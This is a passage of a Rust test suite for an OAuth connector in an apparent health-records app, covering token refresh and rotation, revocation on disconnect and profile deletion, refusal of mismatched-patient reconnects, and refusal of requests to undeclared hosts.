        Err(OAuthError::Vendor { status, code }) => assert_eq!((status, code.as_str()), (503, "server_error")),
        other => panic!("{other:?}"),
    }
    assert_eq!(s.reconsent(id).await?, None);
    assert_eq!(
        s.refresh_token(id).await?.as_deref(),
        t.refresh.as_ref().map(SecretString::expose)
    );
    // a vendor that does not answer at all is a network error, and the same token waits
    let impatient = Egress {
        timeout: std::time::Duration::from_millis(200),
        ..egress()
    };
    let quiet = oauth::access_token(&s.db.pool, &s.sb, id, &impatient, t0() + Duration::hours(2));
    // (a rotating vendor that answers after we gave up would have retired the token: the next
    // refresh then asks for consent; this one does not rotate, so the same token stays good)
    s.fake.set(|b| {
        b.fail_refresh = None;
        b.delay_ms = 1000;
        b.rotate = false;
    });
    assert!(matches!(quiet.await, Err(OAuthError::Net(_))));
    s.fake.set(|b| b.delay_ms = 0);
    s.refresh(id, t0() + Duration::hours(2)).await?;
    Ok(())
}

#[tokio::test]
async fn a_failed_commit_after_the_vendor_rotated_asks_for_consent_instead_of_failing_silently() -> R {
    let s = setup().await?;
    let (id, t) = s.connect(None, t0()).await?;
    // the database refuses the commit of the rotated token (a full disk, a lost connection)
    sqlx::raw_sql(
        "create function s13_fail_at_commit() returns trigger language plpgsql as $$ \
         begin raise exception 'the commit failed'; end $$; \
         create constraint trigger s13_fail_at_commit after update on secret deferrable initially deferred \
         for each row execute function s13_fail_at_commit();",
    )
    .execute(&s.db.pool)
    .await?;
    let now = t0() + Duration::hours(2);
    let err = s
        .refresh(id, now)
        .await
        .expect_err("the access token was handed out before the commit");
    assert!(matches!(err, OAuthError::ReconsentNeeded), "{err:?}");
    assert_eq!(s.reconsent(id).await?, Some(now));
    assert_eq!(s.fake.book().refresh_calls, 1);
    // the old token is still the stored one, and the vendor retired it
    let kept = s.refresh_token(id).await?;
    assert_eq!(kept.as_deref(), t.refresh.as_ref().map(SecretString::expose));
    assert!(!kept.is_some_and(|k| s.fake.book().live.contains(&k)));
    // and the access token of the lost refresh cannot be used
    assert!(matches!(s.refresh(id, now).await, Err(OAuthError::ReconsentNeeded)));
    Ok(())
}

#[tokio::test]
async fn a_vendor_that_does_not_rotate_keeps_the_same_refresh_token() -> R {
    let s = setup().await?;
    s.fake.set(|b| b.rotate = false);
    let (id, t) = s.connect(None, t0()).await?;
    for day in 1..=3 {
        s.refresh(id, t0() + Duration::days(day)).await?;
        assert_eq!(
            s.refresh_token(id).await?.as_deref(),
            t.refresh.as_ref().map(SecretString::expose),
            "day {day}"
        );
    }
    assert_eq!(s.fake.book().refresh_calls, 3);
    assert_eq!(s.reconsent(id).await?, None);
    Ok(())
}

// ------------------------------------------------------ disconnect, revoke ----

#[tokio::test]
async fn disconnect_revokes_at_the_vendor_and_leaves_no_secret_or_cursor() -> R {
    let s = setup().await?;
    let (id, t) = s.connect(None, t0()).await?;
    sqlx::query("update source set cursor = '{\"since\": \"2026-11-01\"}' where id = $1")
        .bind(id)
        .execute(&s.db.pool)
        .await?;
    let out = oauth::disconnect(&s.db.pool, &s.sb, id, &egress()).await?;
    assert_eq!(out, Revocation::Revoked);
    assert_eq!(
        s.fake.book().revoked,
        vec![t.refresh.as_ref().map(|r| r.expose().to_string()).unwrap_or_default()]
    );
    assert_eq!(
        s.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        0
    );
    let row: (Option<Uuid>, Option<Value>, bool, Option<DateTime<Utc>>) =
        sqlx::query_as("select secret_id, cursor, enabled, access_expires_at from source where id = $1")
            .bind(id)
            .fetch_one(&s.db.pool)
            .await?;
    assert_eq!(row, (None, None, false, None));
    // the household's client keeps its own secret
    assert_eq!(
        s.count("select count(*) from secret where purpose = 'connector_client_secret'")
            .await?,
        1
    );
    // nothing is sent for a disconnected source
    assert_eq!(
        refused_code(s.refresh(id, t0() + Duration::hours(2)).await),
        "disconnected"
    );
    assert_eq!(s.fake.book().refresh_calls, 0);
    // a server with no revocation endpoint: the tokens still go
    let mut s2 = setup().await?;
    s2.fake.set(|b| b.revocation = false);
    let spec = oauth::kind_spec("smart").expect("smart");
    s2.endpoints = oauth::resolve(&spec, &s2.fake.issuer(), &egress()).await?;
    let (id2, _) = s2.connect(None, t0()).await?;
    assert_eq!(
        oauth::disconnect(&s2.db.pool, &s2.sb, id2, &egress()).await?,
        Revocation::NotOffered
    );
    assert_eq!(
        s2.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        0
    );
    // and a revocation that fails does not keep them either
    let (id3, _) = s.connect(None, t0()).await?;
    s.fake.set(|b| b.fail_revoke = true);
    assert_eq!(
        oauth::disconnect(&s.db.pool, &s.sb, id3, &egress()).await?,
        Revocation::Failed
    );
    assert_eq!(
        s.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        0
    );
    // a reconnect brings a disconnected source back
    let (back, _) = s.connect(Some(id), t0() + Duration::hours(3)).await?;
    assert_eq!(back, id);
    assert!(
        sqlx::query_scalar::<_, bool>("select enabled and secret_id is not null from source where id = $1")
            .bind(id)
            .fetch_one(&s.db.pool)
            .await?
    );
    Ok(())
}

#[tokio::test]
async fn before_a_profile_delete_every_connection_is_revoked_and_a_failure_is_reported() -> R {
    let s = setup().await?;
    let (a, ta) = s.connect(None, t0()).await?;
    let (b, _) = s.connect(None, t0()).await?;
    let out = oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.alex(), &egress(), CAP).await?;
    assert_eq!(
        out.iter().map(|r| (r.source_id, r.outcome)).collect::<Vec<_>>(),
        vec![(a, Revocation::Revoked), (b, Revocation::Revoked)]
    );
    assert!(
        s.fake
            .book()
            .revoked
            .contains(&ta.refresh.as_ref().map(|r| r.expose().to_string()).unwrap_or_default())
    );
    // a vendor that is down: the outcome says failed, and nothing stops the delete
    s.fake.set(|b| b.fail_revoke = true);
    let out = oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.alex(), &egress(), CAP).await?;
    assert!(out.iter().all(|r| r.outcome == Revocation::Failed), "{out:?}");
    // with no secrets key, a held token counts as failed too, without a request
    let before = s.fake.book().revoked.len();
    let out = oauth::revoke_profile(&s.db.pool, None, s.alex(), &egress(), CAP).await?;
    assert!(out.iter().all(|r| r.outcome == Revocation::Failed), "{out:?}");
    assert_eq!(s.fake.book().revoked.len(), before);
    // another profile's connections are not touched
    assert!(
        oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.fam.profile("sam"), &egress(), CAP)
            .await?
            .is_empty()
    );
    Ok(())
}

#[tokio::test]
async fn a_reconnect_that_signs_in_as_another_patient_is_refused_and_changes_nothing() -> R {
    let s = setup().await?;
    let (id, t) = s.connect(None, t0()).await?;
    sqlx::query("update source set cursor = '{\"since\": \"2026-11-01\"}' where id = $1")
        .bind(id)
        .execute(&s.db.pool)
        .await?;
    type Kept = (Value, Option<Value>, Option<Uuid>, bool, Option<DateTime<Utc>>);
    let read = || async {
        sqlx::query_as::<_, Kept>(
            "select config, cursor, secret_id, enabled, access_expires_at from source where id = $1",
        )
        .bind(id)
        .fetch_one(&s.db.pool)
        .await
    };
    let before = read().await?;
    let url = s.launch(Some(id)).await?;
    let mut c = s.db.pool.acquire().await?;
    let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
    // the person signed in at the vendor with another account (a partner's portal login)
    let other = TokenSet {
        access: SecretString::new("fake-access-of-someone-else"),
        refresh: Some(SecretString::new("fake-refresh-of-someone-else")),
        expires_in: Some(3600),
        refresh_expires_in: None,
        scope: None,
        patient: Some("fake-patient-someone-else".into()),
    };
    let r = oauth::save_connection(&mut c, &s.sb, &p, &s.client, &other, t0() + Duration::hours(1)).await;
    assert_eq!(refused_code(r), "another_patient");
    assert_eq!(read().await?, before, "a refused reconnect changed the source");
    assert_eq!(before.0["patient"], PATIENT);
    assert_eq!(
        s.refresh_token(id).await?.as_deref(),
        t.refresh.as_ref().map(SecretString::expose),
        "the old grant was replaced"
    );
    // the reverse: the same patient reconnects
    let (back, _) = s.connect(Some(id), t0() + Duration::hours(2)).await?;
    assert_eq!(back, id);
    Ok(())
}

#[tokio::test]
async fn a_refused_reconnect_on_a_profile_with_no_key_makes_no_key() -> R {
    let s = setup().await?;
    let (id, _) = s.connect(None, t0()).await?;
    let url = s.launch(Some(id)).await?;
    sqlx::query("delete from profile_key where profile_id = $1")
        .bind(s.alex())
        .execute(&s.db.pool)
        .await?;
    // a process with a fresh keyring, so no key of the profile is held in memory
    let fresh =
        SecretBox::new(&[5u8; 32])?.with_keys(Some(std::sync::Arc::new(Keyring::new(s.kek.clone(), s.db.url.clone()))));
    let mut c = s.db.pool.acquire().await?;
    let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
    let other = TokenSet {
        access: SecretString::new("fake-access-of-someone-else"),
        refresh: Some(SecretString::new("fake-refresh-of-someone-else")),
        expires_in: Some(3600),
        refresh_expires_in: None,
        scope: None,
        patient: Some("fake-patient-someone-else".into()),
    };
    let r = oauth::save_connection(&mut c, &fresh, &p, &s.client, &other, t0() + Duration::hours(1)).await;
    assert_eq!(refused_code(r), "another_patient");
    drop(c);
    let keys: i64 = sqlx::query_scalar("select count(*) from profile_key where profile_id = $1")
        .bind(s.alex())
        .fetch_one(&s.db.pool)
        .await?;
    assert_eq!(keys, 0, "a refused reconnect made a key for the profile");
    Ok(())
}

#[tokio::test]
async fn a_reconnect_launched_for_another_profile_does_not_touch_the_source() -> R {
    let s = setup().await?;
    let (id, t) = s.connect(None, t0()).await?;
    let mut c = s.db.pool.acquire().await?;
    let url = oauth::begin(
        &mut c,
        &Launch {
            kind: "smart",
            client: &s.client,
            endpoints: &s.endpoints,
            profile_id: s.fam.profile("sam"),
            label: "Hospital LabNorte",
            source_id: Some(id),
            user_id: Some(s.fam.user("alex")),
            session_id: None,
            binder: BINDER,
        },
    )
    .await?
    .url;
    let code = s.fake.consent(&url);
    let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
    let tokens = oauth::exchange(&p, &s.client, &code, &egress()).await?;
    let r = oauth::save_connection(&mut c, &s.sb, &p, &s.client, &tokens, t0()).await;
    assert_eq!(refused_code(r), "source_changed");
    assert_eq!(
        s.refresh_token(id).await?.as_deref(),
        t.refresh.as_ref().map(SecretString::expose),
        "another profile's launch replaced this source's grant"
    );
    let profile: Option<Uuid> = sqlx::query_scalar("select profile_id from source where id = $1")
        .bind(id)
        .fetch_one(&s.db.pool)
        .await?;
    assert_eq!(profile, Some(s.alex()));
    Ok(())
}

/// The cap covers the whole revocation: the wait for the row lock a refresh holds, the name lookup
/// and the request.
#[tokio::test]
async fn a_revocation_before_a_delete_is_capped_as_a_whole_even_behind_a_refresh_that_holds_the_row() -> R {
    let s = setup().await?;
    let (id, _) = s.connect(None, t0()).await?;
    s.fake.set(|b| b.delay_ms = 4_000);
    let cap = std::time::Duration::from_secs(1);
    let (refreshed, (out, took)) = tokio::join!(s.refresh(id, t0() + Duration::hours(2)), async {
        // the refresh holds the row from before its request until it commits
        for _ in 0..100 {
            if s.fake.book().in_flight > 0 {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        let started = std::time::Instant::now();
        let out = oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.alex(), &egress(), cap).await;
        (out, started.elapsed())
    });
    assert!(refreshed.is_ok(), "{refreshed:?}");
    let out = out?;
    assert_eq!(
        out.iter().map(|r| (r.source_id, r.outcome)).collect::<Vec<_>>(),
        vec![(id, Revocation::Failed)]
    );
    assert!(took < cap + std::time::Duration::from_millis(1_500), "waited {took:?}");
    assert!(s.fake.book().revoked.is_empty());
    // the reverse: with the row free, the same cap revokes
    s.fake.set(|b| b.delay_ms = 0);
    let out = oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.alex(), &egress(), cap).await?;
    assert_eq!(
        out.iter().map(|r| r.outcome).collect::<Vec<_>>(),
        vec![Revocation::Revoked]
    );
    Ok(())
}

// ---------------------------------------------------------- declared hosts ----

#[tokio::test]
async fn a_poller_asking_for_an_undeclared_host_is_refused_and_no_request_goes_out() -> R {
    let s = setup().await?;
    let (id, _) = s.connect(None, t0()).await?;
    let mut c = s.db.pool.acquire().await?;
    let source = ownhealth_core::sources::get_source(&mut c, id)
        .await?
        .expect("the source");
    let http = SourceHttp::for_source(&source, egress());
    let other = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
    let port = other.local_addr()?.port();
    for url in [
        format!("http://127.0.0.1:{port}/fhir/Patient"),
        format!(
            "http://localhost:{}/fhir/Patient",
            s.fake.base.rsplit(':').next().unwrap_or_default()
        ),
    ] {
        match http.get(&url, &[]).await {
            Err(OAuthError::UndeclaredHost(h)) => assert!(url.contains(h.split(':').next().unwrap_or("?")), "{h}"),
            other => panic!("{url}: {other:?}"),
        }
        assert!(matches!(
            http.post_form(&url, &[], &[("a", "b")]).await,
            Err(OAuthError::UndeclaredHost(_))
        ));
        assert!(matches!(
            http.post_json(&url, &[], &serde_json::json!({})).await,
            Err(OAuthError::UndeclaredHost(_))
        ));
    }
    assert!(
        tokio::time::timeout(std::time::Duration::from_millis(300), other.accept())
            .await
            .is_err(),
        "a request reached an undeclared host"
    );
    // the declared host is reached
    let ok = http
        .get(&format!("{}/.well-known/smart-configuration", s.fake.issuer()), &[])
        .await?;
    assert_eq!(ok.status, 200);
    // a source that declared nothing reaches nothing
    let bare = SourceHttp::new(Vec::new(), egress());
    assert!(matches!(
        bare.get(&format!("{}/x", s.fake.issuer()), &[]).await,
        Err(OAuthError::UndeclaredHost(_))
    ));
    Ok(())
}

#[tokio::test]
async fn committing_a_grant_without_a_refresh_token_makes_the_access_token_available() -> R {
    let s = setup().await?;
    let save = |source_id: Option<Uuid>, rollback: bool| {
        let s = &s;
        async move {
            let url = s.launch(source_id).await?;
            let code = s.fake.consent(&url);
            let mut tx = s.db.pool.begin().await?;
            let p = oauth::take_state(&mut tx, &param(&url, "state").unwrap_or_default(), BINDER).await?;
            let mut tokens = oauth::exchange(&p, &s.client, &code, &egress()).await?;
            tokens.refresh = None;
            let id = oauth::save_connection(&mut tx, &s.sb, &p, &s.client, &tokens, t0()).await?;
            if rollback {
                tx.rollback().await?;
            } else {
                tx.commit().await?;
            }
            Ok::<_, anyhow::Error>((id, tokens.access))
        }
    };
    let (id, original) = save(None, false).await?;
    let stored: Option<String> =
        sqlx::query_scalar("select to_jsonb(s)->>'oauth_access_token' from source s where id = $1")
            .bind(id)
            .fetch_one(&s.db.pool)
            .await?;
    assert!(
        stored.is_some(),
        "the committed grant must carry its access token for a separate worker"
    );
    let encrypted = hex::decode(
        stored
            .as_deref()
            .and_then(|s| s.strip_prefix(r"\x"))
            .unwrap_or_default(),
    )?;
    assert!(!encrypted.is_empty());
    assert!(
        !encrypted
            .windows(original.expose().len())
            .any(|w| w == original.expose().as_bytes())
    );
    let worker =
        SecretBox::new(&[5u8; 32])?.with_keys(Some(std::sync::Arc::new(Keyring::new(s.kek.clone(), s.db.url.clone()))));
    let without_profile_keys = SecretBox::new(&[5u8; 32])?;
    assert!(
        oauth::access_token(&s.db.pool, &without_profile_keys, id, &egress(), t0())
            .await
            .is_err()
    );
    let first = oauth::access_token(&s.db.pool, &worker, id, &egress(), t0()).await?;
    assert!(first == original);
    assert_eq!(s.reconsent(id).await?, None);
    save(Some(id), true).await?;
    let after_rollback = s.refresh(id, t0()).await?;
    assert!(after_rollback == original);
    assert_eq!(s.reconsent(id).await?, None);
    let (_, replacement) = save(Some(id), false).await?;
    assert!(replacement != original);
    assert!(s.refresh(id, t0()).await? == replacement);
    assert_eq!(s.fake.book().refresh_calls, 0);
    assert_eq!(
        oauth::disconnect(&s.db.pool, &worker, id, &egress()).await?,
        Revocation::NoToken
    );
    let gone: bool =
        sqlx::query_scalar("select oauth_access_token is null and access_expires_at is null from source where id = $1")
            .bind(id)
            .fetch_one(&s.db.pool)
            .await?;
    assert!(gone);
    Ok(())
}
